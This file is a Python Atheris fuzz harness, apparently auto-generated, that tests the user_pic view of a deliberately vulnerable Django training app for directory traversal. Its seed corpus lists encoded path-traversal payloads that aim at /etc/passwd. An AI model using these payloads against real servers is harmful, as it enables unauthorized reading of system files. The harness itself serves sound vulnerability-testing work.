import atheris
import sys
import re
import os



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/realvuln-lets-be-bad-guys"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

import django
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "badguys.settings")
django.setup()

with atheris.instrument_imports():

    from badguys.vulnerable.views import user_pic
    from django.http import HttpRequest


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("root:x:0:0", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_PATH_INJECTION: directory traversal bypass detected — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "request", "index": 0, "type": "HttpRequest"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : return_value
# patch_target     : None
# target_arg_index : None
# target_arg_name  : None
# input_strategy   : direct_params
# signature        : def user_pic(request)
# condition        : The return value contains contents of /etc/passwd (e.g., 'root:x:0:0'), confirming successful directory traversal to read an arbitrary file outside the intended base_path
# capture_what     : return value of user_pic function (HttpResponse containing file contents read via the traversed path)
# skip_hint        : False
# ========================================


# === RETURN_VALUE SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Call target function directly and capture the return value.
# 4. Extract string content from the return value (based on capture_what).
# 5. Compare captured string against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    
    payload = fdp.ConsumeBytes(len(data)).decode('utf-8', errors='ignore')
    
    request = HttpRequest()
    request.method = 'GET'
    request.GET = {
        'pic': payload,
        'file': payload,
        'path': payload,
        'name': payload,
        'image': payload,
        'user': payload,
        'username': payload,
        'id': payload,
    }
    request.META = {}
    request.POST = {}
    
    try:
        result = user_pic(request)
    except RuntimeError:
        raise
    except Exception:
        return
    
    if result is None:
        return
    
    try:
        captured = result.content.decode('utf-8', errors='ignore')
    except Exception:
        try:
            captured = str(result)
        except Exception:
            return
    
    for pattern in _COMPILED_PATTERNS:
        match = pattern.search(captured)
        if match:
            raise RuntimeError(_RAISE_MESSAGE.format(captured=captured[:200], matched_pattern=match.group()))


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
_SEED_CORPUS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "../../../etc/passwd%00.png",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..\\..\\..\\etc\\passwd",
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "output/python/realvuln-lets-be-bad-guys/fuzz_corpus/py_path_injection_badguys_vulnerable_views_py_42"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                if isinstance(_seed, bytes):
                    _f.write(_seed)
                else:
                    _f.write(_seed.encode("utf-8"))

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()